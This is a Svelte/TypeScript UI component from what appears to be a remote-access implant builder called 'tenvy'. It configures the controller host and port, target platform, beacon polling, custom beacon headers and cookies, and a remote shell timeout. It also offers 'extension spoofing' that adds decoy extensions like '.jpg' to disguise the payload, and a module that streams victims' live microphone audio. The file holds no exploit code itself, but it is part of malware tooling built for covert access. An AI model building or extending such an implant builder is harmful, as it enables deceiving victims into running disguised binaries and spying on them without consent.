<script lang="ts">
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Checkbox } from '$lib/components/ui/checkbox/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Select, SelectTrigger, SelectContent, SelectItem } from '$lib/components/ui/select/index.js';
  	import * as Collapsible from "$lib/components/ui/collapsible/index.js";
	import {
		TARGET_OS_OPTIONS,
		ARCHITECTURE_OPTIONS_BY_OS,
		EXTENSION_OPTIONS_BY_OS,
		EXTENSION_SPOOF_PRESETS,
		INPUT_FIELD_CLASSES,
		type CookieKV,
		type ExtensionSpoofPreset,
		type HeaderKV,
		type TargetArch,
		type TargetOS
	} from '../lib/constants.js';
	import { inputValueFromEvent } from '../lib/utils.js';
	import { cn } from '$lib/utils.js';
	import { Plus, Trash2, ChevronUp, ChevronDown } from '@lucide/svelte';
	import {
		agentModules,
		type AgentModuleDefinition
	} from '../../../../../../shared/modules/index.js';

	interface Props {
		host: string;
		port: string;
		outputFilename: string;
		targetOS: TargetOS;
		targetArch: TargetArch;
		outputExtension: string;
		extensionSpoofingEnabled: boolean;
		extensionSpoofPreset: ExtensionSpoofPreset;
		extensionSpoofCustom: string;
		extensionSpoofError: string | null;
		pollIntervalMs: string;
		maxBackoffMs: string;
		shellTimeoutSeconds: string;
		customHeaders: HeaderKV[];
		customCookies: CookieKV[];
		audioStreamingEnabled: boolean;
		audioStreamingTouched: boolean;
		markAudioStreamingTouched: () => void;
		availableModules?: AgentModuleDefinition[];
		selectedModules: string[];

		addCustomHeader: () => void;
		updateCustomHeader: (index: number, key: keyof HeaderKV, value: string) => void;
		removeCustomHeader: (index: number) => void;
		addCustomCookie: () => void;
		updateCustomCookie: (index: number, key: keyof CookieKV, value: string) => void;
		removeCustomCookie: (index: number) => void;
	}

	let {
		host = $bindable(),
		port = $bindable(),
		outputFilename = $bindable(),
		targetOS = $bindable(),
		targetArch = $bindable(),
		outputExtension = $bindable(),
		extensionSpoofingEnabled = $bindable(),
		extensionSpoofPreset = $bindable(),
		extensionSpoofCustom = $bindable(),
		extensionSpoofError,
		pollIntervalMs = $bindable(),
		maxBackoffMs = $bindable(),
		shellTimeoutSeconds = $bindable(),
		customHeaders,
		customCookies,
		audioStreamingEnabled = $bindable(),
		audioStreamingTouched,
		markAudioStreamingTouched,
		availableModules = agentModules,
		selectedModules = $bindable(),
		addCustomHeader,
		updateCustomHeader,
		removeCustomHeader,
		addCustomCookie,
		updateCustomCookie,
		removeCustomCookie
	}: Props = $props();

	let isConnectionOpen = $state(false);
	let isModulesOpen = $state(false);
	const hasModuleSelection = $derived(selectedModules.length > 0);

	function toggleModuleSelection(moduleId: string) {
		const trimmed = moduleId.trim();
		if (!trimmed) {
			return;
		}
		if (selectedModules.includes(trimmed)) {
			selectedModules = selectedModules.filter((id) => id !== trimmed);
			return;
		}
		const baseOrder = new Map(availableModules.map((module, index) => [module.id, index]));
		const next = [...selectedModules, trimmed];
		next.sort((left, right) => {
			const leftIndex = baseOrder.get(left) ?? Number.MAX_SAFE_INTEGER;
			const rightIndex = baseOrder.get(right) ?? Number.MAX_SAFE_INTEGER;
			return leftIndex - rightIndex;
		});
		selectedModules = next;
	}
</script>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Primary endpoint</h3>
		<p class="text-xs text-muted-foreground">
			Configure how new agents establish their first connection.
		</p>
	</div>
	<div class="grid gap-6 md:grid-cols-2">
		<div class="grid gap-2">
			<Label for="host">Host</Label>
			<Input id="host" placeholder="controller.tenvy.local" bind:value={host} />
		</div>
		<div class="grid gap-2">
			<Label for="port">Port</Label>
			<Input id="port" placeholder="2332" bind:value={port} inputmode="numeric" />
		</div>
		<div class="grid gap-2">
			<Label for="output">Output filename</Label>
			<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
		</div>
	</div>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Target platform</h3>
		<p class="text-xs text-muted-foreground">
			Choose the operating system, architecture, and packaging format.
		</p>
	</div>
	<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
		<div class="grid gap-2">
			<Label for="target-os">Target operating system</Label>
			<Select type="single" bind:value={targetOS}>
				<SelectTrigger id="target-os" class="w-full">
					{TARGET_OS_OPTIONS.find((o) => o.value === targetOS)?.label ?? 'Select OS'}
				</SelectTrigger>
				<SelectContent>
					{#each TARGET_OS_OPTIONS as option (option.value)}
						<SelectItem value={option.value}>{option.label}</SelectItem>
					{/each}
				</SelectContent>
			</Select>
		</div>
		<div class="grid gap-2">
			<Label for="target-arch">Architecture</Label>
			<Select type="single" bind:value={targetArch}>
				<SelectTrigger id="target-arch" class="w-full">
					{(ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? []).find((o) => o.value === targetArch)
						?.label ?? 'Select Architecture'}
				</SelectTrigger>
				<SelectContent>
					{#each ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? [] as option (option.value)}
						<SelectItem value={option.value}>{option.label}</SelectItem>
					{/each}
				</SelectContent>
			</Select>
		</div>
		<div class="grid gap-2">
			<Label for="extension">File extension</Label>
			<Select type="single" bind:value={outputExtension}>
				<SelectTrigger id="extension" class="w-full">
					{outputExtension || 'Select Extension'}
				</SelectTrigger>
				<SelectContent>
					{#each EXTENSION_OPTIONS_BY_OS[targetOS] ?? [] as option (option)}
						<SelectItem value={option}>{option}</SelectItem>
					{/each}
				</SelectContent>
			</Select>
		</div>
		<div class="md:col-span-2 lg:col-span-3">
			<div class="space-y-4 rounded-lg border border-dashed border-border/70 bg-background/40 p-4">
				<div class="flex flex-wrap items-center justify-between gap-3">
					<div>
						<p class="text-sm font-semibold">Extension spoofing</p>
						<p class="text-xs text-muted-foreground">
							Append a decoy extension before the actual package to disguise the payload.
						</p>
					</div>
					<div class="flex items-center gap-2 text-xs text-muted-foreground">
						<Switch
							bind:checked={extensionSpoofingEnabled}
							aria-label="Toggle extension spoofing"
						/>
						<span>{extensionSpoofingEnabled ? 'Enabled' : 'Disabled'}</span>
					</div>
				</div>
				{#if extensionSpoofingEnabled}
					<div class="grid gap-4 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
						<div class="grid gap-2">
							<Label for="spoof-preset">Common disguises</Label>
							<Select type="single" bind:value={extensionSpoofPreset}>
								<SelectTrigger id="spoof-preset" class="w-full">
									{extensionSpoofPreset || 'Select Disguise'}
								</SelectTrigger>
								<SelectContent>
									{#each EXTENSION_SPOOF_PRESETS as preset (preset)}
										<SelectItem value={preset}>{preset}</SelectItem>
									{/each}
								</SelectContent>
							</Select>
							<p class="text-xs text-muted-foreground">Select a predefined disguise.</p>
						</div>
						<div class="grid gap-2">
							<Label for="spoof-custom">Custom extension</Label>
							<Input
								id="spoof-custom"
								placeholder=".jpg"
								bind:value={extensionSpoofCustom}
								aria-invalid={Boolean(extensionSpoofError)}
							/>
							<p class="text-xs text-muted-foreground">
								Must begin with a dot and include 1-12 letters or numbers.
							</p>
						</div>
					</div>
					{#if extensionSpoofError}
						<p class="text-sm text-destructive">{extensionSpoofError}</p>
					{/if}
				{/if}
			</div>
		</div>
	</div>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<Collapsible.Root bind:open={isConnectionOpen}>
		<Collapsible.Trigger class="flex w-full items-center justify-between text-left">
			<div class="space-y-1">
				<h3 class="text-sm font-semibold">Connection behaviour</h3>
				<p class="text-xs text-muted-foreground">
					Fine-tune how the agent polls the controller and handles network jitter.
				</p>
			</div>
			<ChevronDown
				class={cn(
					'h-4 w-4 text-muted-foreground transition-transform duration-200',
					isConnectionOpen && 'rotate-180'
				)}
			/>
		</Collapsible.Trigger>
		<Collapsible.Content>
			<div class="grid gap-6 md:grid-cols-3 mt-4">
				<div class="grid gap-2">
					<Label for="poll-interval">Poll interval (ms)</Label>
					<Input
						id="poll-interval"
						placeholder="5000"
						bind:value={pollIntervalMs}
						inputmode="numeric"
					/>
					<p class="text-xs text-muted-foreground">Leave blank to use the controller default.</p>
				</div>
				<div class="grid gap-2">
					<Label for="max-backoff">Max backoff (ms)</Label>
					<Input id="max-backoff" placeholder="60000" bind:value={maxBackoffMs} inputmode="numeric" />
					<p class="text-xs text-muted-foreground">
						Determines the ceiling for exponential backoff after failures.
					</p>
				</div>
				<div class="grid gap-2">
					<Label for="shell-timeout">Shell timeout (s)</Label>
					<Input
						id="shell-timeout"
						placeholder="30"
						bind:value={shellTimeoutSeconds}
						inputmode="numeric"
					/>
					<p class="text-xs text-muted-foreground">
						Applies to remote shell commands without explicit overrides.
					</p>
				</div>
			</div>
			<div class="space-y-6 rounded-lg border border-dashed border-border/70 p-4 mt-4">
				<div class="flex flex-wrap items-center justify-between gap-2">
					<div>
						<p class="text-sm font-semibold">Network customization</p>
						<p class="text-xs text-muted-foreground">
							Override HTTP headers or cookies embedded in beacon traffic.
						</p>
					</div>
					<Badge
						variant="outline"
						class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
					>
						Advanced
					</Badge>
				</div>
				<div class="space-y-3">
					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
						Custom headers
					</p>
					<div class="space-y-3">
						{#each customHeaders as header, index (index)}
							{@const headerKeyId = `custom-header-${index}-key`}
							{@const headerValueId = `custom-header-${index}-value`}
							<div class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center">
								<div class="grid gap-1">
									<Label class="sr-only" for={headerKeyId}>Header name</Label>
									<input
										id={headerKeyId}
										class={INPUT_FIELD_CLASSES}
										placeholder="Header name"
										value={header.key}
										oninput={(event) => updateCustomHeader(index, 'key', inputValueFromEvent(event))}
									/>
								</div>
								<div class="grid gap-1">
									<Label class="sr-only" for={headerValueId}>Header value</Label>
									<input
										id={headerValueId}
										class={INPUT_FIELD_CLASSES}
										placeholder="Header value"
										value={header.value}
										oninput={(event) => updateCustomHeader(index, 'value', inputValueFromEvent(event))}
									/>
								</div>
								<Button
									type="button"
									variant="ghost"
									size="sm"
									class="text-destructive hover:text-destructive"
									onclick={() => removeCustomHeader(index)}
								>
									<Trash2 class="h-4 w-4" />
									<span class="sr-only">Remove header</span>
								</Button>
							</div>
						{/each}
					</div>
					<Button
						type="button"
						variant="ghost"
						size="sm"
						class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
						onclick={addCustomHeader}
					>
						<Plus class="h-4 w-4" />
						Add header
					</Button>
				</div>
				<div class="space-y-3">
					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
						Custom cookies
					</p>
					<div class="space-y-3">
						{#each customCookies as cookie, index (index)}
							{@const cookieNameId = `custom-cookie-${index}-name`}
							{@const cookieValueId = `custom-cookie-${index}-value`}
							<div class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center">
								<div class="grid gap-1">
									<Label class="sr-only" for={cookieNameId}>Cookie name</Label>
									<input
										id={cookieNameId}
										class={INPUT_FIELD_CLASSES}
										placeholder="Cookie name"
										value={cookie.name}
										oninput={(event) => updateCustomCookie(index, 'name', inputValueFromEvent(event))}
									/>
								</div>
								<div class="grid gap-1">
									<Label class="sr-only" for={cookieValueId}>Cookie value</Label>
									<input
										id={cookieValueId}
										class={INPUT_FIELD_CLASSES}
										placeholder="Cookie value"
										value={cookie.value}
										oninput={(event) => updateCustomCookie(index, 'value', inputValueFromEvent(event))}
									/>
								</div>
								<Button
									type="button"
									variant="ghost"
									size="sm"
									class="text-destructive hover:text-destructive"
									onclick={() => removeCustomCookie(index)}
								>
									<Trash2 class="h-4 w-4" />
									<span class="sr-only">Remove cookie</span>
								</Button>
							</div>
						{/each}
					</div>
					<Button
						type="button"
						variant="ghost"
						size="sm"
						class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
						onclick={addCustomCookie}
					>
						<Plus class="h-4 w-4" />
						Add cookie
					</Button>
				</div>
			</div>
		</Collapsible.Content>
	</Collapsible.Root>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<Collapsible.Root bind:open={isModulesOpen}>
		<Collapsible.Trigger class="flex w-full items-center justify-between text-left">
			<div class="space-y-1">
				<h3 class="text-sm font-semibold">Optional modules</h3>
				<p class="text-xs text-muted-foreground">
					Enable features that require platform-specific toolchains during compilation.
				</p>
			</div>
			<ChevronDown
				class={cn(
					'h-4 w-4 text-muted-foreground transition-transform duration-200',
					isModulesOpen && 'rotate-180'
				)}
			/>
		</Collapsible.Trigger>
		<Collapsible.Content>
			<div
				class="flex flex-wrap items-start justify-between gap-4 rounded-lg border border-dashed border-border/70 bg-background/40 p-4 mt-4"
			>
				<div class="space-y-2 text-xs text-muted-foreground">
					<p class="text-sm font-semibold text-foreground">Audio streaming support</p>
					<p>
						Bundle the CGO-based audio bridge so agents can enumerate devices and stream live microphone
						audio.
					</p>
					{#if audioStreamingEnabled}
						<p class="font-medium text-emerald-500">
							CGO will be enabled and the realtime audio bridge compiled into the binary.
						</p>
					{:else if audioStreamingTouched}
						<p class="font-medium text-amber-500">
							Audio support explicitly disabled &mdash; the stub bridge will respond with errors.
						</p>
					{:else}
						<p>Leave disabled to keep binaries smaller and avoid CGO cross-compilers.</p>
					{/if}
				</div>
				<div class="flex items-center gap-2 text-xs text-muted-foreground">
					<Switch
						bind:checked={audioStreamingEnabled}
						onchange={markAudioStreamingTouched}
						aria-label="Toggle audio streaming support"
					/>
					<span>{audioStreamingEnabled ? 'Enabled' : 'Disabled'}</span>
				</div>
			</div>
			<div class="space-y-4">
				<div class="flex flex-wrap items-center justify-between gap-3">
					<div class="space-y-1">
						<p class="text-sm font-semibold">Agent modules</p>
						<p class="text-xs text-muted-foreground">
							Select which modules are compiled into the binary. Unselected modules remain disabled at
							runtime.
						</p>
					</div>
					{#if availableModules.length > 0}
						<span
							class="rounded-full border border-border/70 bg-background/60 px-2.5 py-1 text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
						>
							{selectedModules.length}/{availableModules.length} selected
						</span>
					{/if}
				</div>
				{#if !hasModuleSelection}
					<p class="text-xs font-medium text-amber-500">
						No modules selected. Generated agents will expose only stub command handlers.
					</p>
				{/if}
				<div class="grid gap-3 md:grid-cols-2">
					{#each availableModules as module (module.id)}
						{@const moduleInputId = `module-${module.id}`}
						{@const isSelected = selectedModules.includes(module.id)}
						<label
							for={moduleInputId}
							class={`flex cursor-pointer flex-col gap-3 rounded-lg border p-4 transition-colors ${
								isSelected
									? 'border-primary/60 bg-primary/10'
									: 'border-border/70 bg-background/40 hover:border-primary/40'
							}`}
						>
							<div class="flex items-start justify-between gap-3">
								<div class="space-y-1">
									<p class="text-sm font-semibold text-foreground">{module.title}</p>
									<p class="text-xs leading-snug text-muted-foreground">{module.description}</p>
								</div>
								<Checkbox
									id={moduleInputId}
									checked={isSelected}
									onchange={() => toggleModuleSelection(module.id)}
									aria-label={`Toggle ${module.title}`}
								/>
							</div>
							{#if module.commands.length > 0}
								<div class="flex flex-wrap gap-1">
									{#each module.commands as command (command)}
										<Badge
											variant="outline"
											class="border-border/60 bg-background/60 text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
										>
											{command}
										</Badge>
									{/each}
								</div>
							{/if}
						</label>
					{/each}
				</div>
			</div>
		</Collapsible.Content>
	</Collapsible.Root>
</section>
